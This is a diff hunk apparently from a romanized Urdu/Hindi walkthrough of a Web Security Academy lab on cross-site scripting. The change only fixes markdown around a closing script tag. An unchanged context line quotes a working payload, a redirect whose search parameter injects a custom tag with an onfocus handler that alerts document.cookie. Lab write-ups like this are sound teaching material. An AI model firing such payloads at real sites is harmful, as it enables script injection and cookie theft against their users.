@@ -21,7 +21,7 @@ Yeh lab hum se chahta hai ke hum XSS inject karein ek aise page mein jahan:
 
 ```location =``` ```'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29+tabindex%3D1%3E#x';```
 
-</script>```
+```</script>```
 
 ---
 
